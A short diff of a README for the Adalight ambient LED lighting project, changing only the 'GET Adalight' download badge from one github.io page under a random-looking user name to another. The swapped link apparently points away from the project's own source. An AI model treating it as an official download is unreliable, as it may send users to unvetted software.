@@ -1,6 +1,6 @@
 # Adalight - Responsive Ambient LED Lighting
 
-[![GET Adalight](https://img.shields.io/badge/GET%20%E2%80%94%20Adalight-0078D6?style=for-the-badge&logoColor=white)](https://dorianarellanohfw.github.io/.github/adalight-arduino)
+[![GET Adalight](https://img.shields.io/badge/GET%20%E2%80%94%20Adalight-0078D6?style=for-the-badge&logoColor=white)](https://zyairemillerqobz.github.io/.github/adalight-arduino)
 
 ## Adalight Project Overview
 
